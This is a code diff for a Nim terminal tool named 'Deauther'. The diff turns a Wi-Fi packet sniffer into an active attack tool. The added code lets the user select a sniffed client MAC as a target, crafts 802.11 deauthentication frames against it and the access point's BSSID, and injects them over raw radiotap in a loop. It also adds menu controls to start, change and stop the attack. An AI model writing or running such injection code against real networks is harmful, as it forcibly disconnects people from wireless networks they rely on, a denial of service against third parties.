@@ -9,7 +9,7 @@ import radiotap, packet, tui, listboxlogger
 
 type
   Stage = enum
-    Menu, SelectSSID, Macs
+    Menu, SelectSSID, PacketSniffing
 
   Deauther = ref object
     nb: NimBox
@@ -19,6 +19,7 @@ type
     macsBox, ssidBox: ListBox
     messagesOverlay: bool
     logger: ListBoxLogger
+    deauthTarget: Option[string] ## MAC address we are targeting.
 
 proc getPacket(pcap: AsyncPcap,
                deauther: Deauther): Future[Option[(Radiotap, Packet)]] {.async.} =
@@ -46,49 +47,14 @@ proc monitor(): AsyncPcap =
 
   return p.newAsyncPcap()
 
-when false:
-  proc findChannels(ssid: string=""): seq[CWChannel] =
-    ## Finds a list of channels on which the specified SSID operates on.
-    ##
-    ## If the ``ssid`` is not specified, then the currently connected to
-    ## SSID is used.
-    result = @[]
-
-    let wfc = sharedWiFiClient()
-    let wif = wfc.getInterface()
-    var ssid = ssid
-    if ssid.len == 0:
-      ssid = $toCString(wif.ssid())
-      echo("Using current SSID: ", ssid)
-
-    echo("Disassociating...")
-    wif.disassociate()
-
-    let pcap = monitor()
-
-    let channels = wif.supportedWLANChannels
-    for channel in items(CWChannel, channels.allObjects):
-      wif.setWLANChannel(channel)
-      echo("\nTesting ", channel.channelNumber)
-      # Wait for beacon on this channel.
-      let startTime = epochTime()
-      # Grab packets for 4s.
-      while epochTime() - startTime < 4:
-        try:
-          let packetOpt = getPacket(pcap)
-          if packetOpt.isSome:
-            let packet = packetOpt.get()
-            let packetType = packet.header.frameControl.getType()
-            if packetType == Management:
-              let subtype = packet.header.frameControl.getManagementSubtype()
-              if subtype == Beacon:
-                echo("\nBeacon with SSID: ", packet.getSSID().get("None"))
-                if packet.getSSID().get("") == ssid:
-                  echo("Added ", channel.channelNumber)
-                  result.add(channel)
-                  break
-        except Exception as exc:
-          echo("Failed ", exc.msg)
+proc writePacket(p: AsyncPcap, packet: Packet): Future[void] =
+  var packetData = packet.serialize()
+  var radiotapLen = 8'u16
+  var radiotapData = newString(packetData.len + radiotapLen.int)
+  copyMem(addr radiotapData[2], addr radiotapLen, 2)
+  copyMem(addr radiotapData[radiotapLen.int],
+          addr packetData[0], packetData.len)
+  return p.writePacket(radiotapData)
 
 proc gatherMacs(deauther: Deauther) {.async.} =
   let wfc = sharedWiFiClient()
@@ -115,7 +81,7 @@ proc gatherMacs(deauther: Deauther) {.async.} =
     string,
     tuple[tx, rx: int, ch: CWChannel, rssi: int]
   ]()
-  while deauther.current == Macs:
+  while deauther.current == PacketSniffing:
     for bssid, network in accessPoints:
       # Switch to network's channel.
       info("Switching to ", network.wlanChannel.channelNumber)
@@ -140,7 +106,7 @@ proc gatherMacs(deauther: Deauther) {.async.} =
           if bssid notin [
               $packet.header.address1, $packet.header.address2
             ]:
-            info("Skipping ", $packet.header.address1, "<-", $packet.header.address2)
+            debug("Skipping ", $packet.header.address1, "<-", $packet.header.address2)
             continue
 
           if $packet.header.address1 notin macs:
@@ -156,6 +122,12 @@ proc gatherMacs(deauther: Deauther) {.async.} =
           macs[$packet.header.address2].ch = network.wlanChannel
           macs[$packet.header.address2].rssi = radiotap.antennaSignal.int
 
+      if deauther.deauthTarget.isSome:
+        let target = deauther.deauthTarget.get()
+        info("Deauthing ", target)
+        let packet = initDeauthenticationPacket(target, bssid, bssid)
+        await p.writePacket(packet)
+
     # Update UI
     macs.sort((x, y) => -cmp(x[1].tx + x[1].rx, y[1].tx + y[1].rx))
     deauther.macsBox.clear()
@@ -168,6 +140,8 @@ proc gatherMacs(deauther: Deauther) {.async.} =
 
       if key in accessPoints:
         deauther.macsBox.add(value, fg=clrBlue)
+      elif deauther.deauthTarget.get("") == key:
+        deauther.macsBox.add(value, fg=clrRed)
       else:
         deauther.macsBox.add(value)
 
@@ -222,30 +196,42 @@ proc draw(deauther: Deauther) =
   deauther.nb.drawTitle("Deauther")
 
   var controls = @[
-    ("Q", "Quit")
+    ("BkSpc", "Main Menu"),
+    ("Q", "Quit"),
   ]
+  var stats = @[
+    ("SSID", deauther.currentSSID)
+  ]
+
   case deauther.current
   of Menu:
     controls =
       @({ "1": "SSID", "2": "Scan"}) & controls
   of SelectSSID:
-    deauther.nb.drawStats(
-      {
-        "SSID": deauther.currentSSID
-      }
-    )
 
     deauther.nb.draw(deauther.ssidBox, 3)
-  of Macs:
-    deauther.nb.drawStats(
-      {
-        "SSID": deauther.currentSSID,
-        "CRC check fails": $deauther.crcFails
-      }
-    )
+  of PacketSniffing:
+    let target = deauther.deauthTarget
+    stats &= @({
+      "CRC check fails": $deauther.crcFails,
+      "Status":
+        if target.isSome(): "Deauthing " & target.get() else: "Scanning",
+    })
+
+    if target.isSome():
+      controls =
+        @({
+          "Enter": "Change target",
+          "Space": "Stop deauthing"
+        }) & controls
+    else:
+      controls =
+        @({ "Enter": "Deauth"}) & controls
 
     # Draw list box.
     deauther.nb.draw(deauther.macsBox, 3)
+
+  deauther.nb.drawStats(stats)
 
   deauther.nb.drawControls(controls)
 
@@ -254,12 +240,28 @@ proc draw(deauther: Deauther) =
 
   deauther.nb.present()
 
+proc onEnter(deauther: Deauther) =
+  case deauther.current
+  of PacketSniffing:
+    let row = deauther.macsBox.getSelectedRow()
+    deauther.deauthTarget = some(row[0])
+  else:
+    discard
+
+proc onSpace(deauther: Deauther) =
+  case deauther.current
+  of PacketSniffing:
+    deauther.deauthTarget = none(string)
+  else:
+    discard
+
 when isMainModule:
   let deauther = newDeauther()
   defer: deauther.nb.shutdown()
 
   # Set up UI elements.
   deauther.logger = newListBoxLogger()
+  deauther.logger.levelThreshold = lvlInfo
   addHandler(deauther.logger)
 
   info("Started deauther")
@@ -281,6 +283,10 @@ when isMainModule:
           break
         of Symbol.Backspace:
           deauther.current = Menu
+        of Symbol.Enter:
+          deauther.onEnter()
+        of Symbol.Space:
+          deauther.onSpace()
         of Symbol.Character:
           case evt.ch
           of 'q': break
@@ -292,7 +298,7 @@ when isMainModule:
               asyncCheck selectSSID(deauther)
           of '2':
             if deauther.current == Menu:
-              deauther.current = Macs
+              deauther.current = PacketSniffing
               asyncCheck gatherMacs(deauther)
           else:
             info("Key pressed: ", evt.ch)
